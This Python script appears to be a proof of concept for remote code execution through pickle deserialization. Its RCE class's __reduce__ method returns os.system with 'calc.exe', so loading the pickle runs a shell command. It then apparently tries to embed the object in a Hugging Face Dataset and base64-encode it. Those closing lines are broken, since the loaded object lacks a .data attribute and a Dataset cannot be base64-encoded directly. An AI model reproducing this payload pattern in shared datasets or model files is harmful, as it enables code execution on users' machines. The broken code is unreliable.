from datasets import Dataset
import base64
import os
import pickle


class RCE:
    def __reduce__(self):
        cmd = ('calc.exe')
        return (os.system, (cmd,))

    def get_data(self):
        return self.__reduce__()


if __name__ == '__main__':
    rce_instance = RCE()

    # print(base64.urlsafe_b64encode(pickled))
    with open('rce_instance.pickle', 'wb') as f:
        pickle.dump(rce_instance, f)

    # pickled = load_dataset('txt',path='./rce_instance.pickle')
    with open('rce_instance.pickle', 'rb') as f:
        rce_instance = pickle.load(f)

    data = {'column_name': rce_instance.data}
    dataset = Dataset.from_dict(data)

    serialized_object = base64.urlsafe_b64encode(dataset)
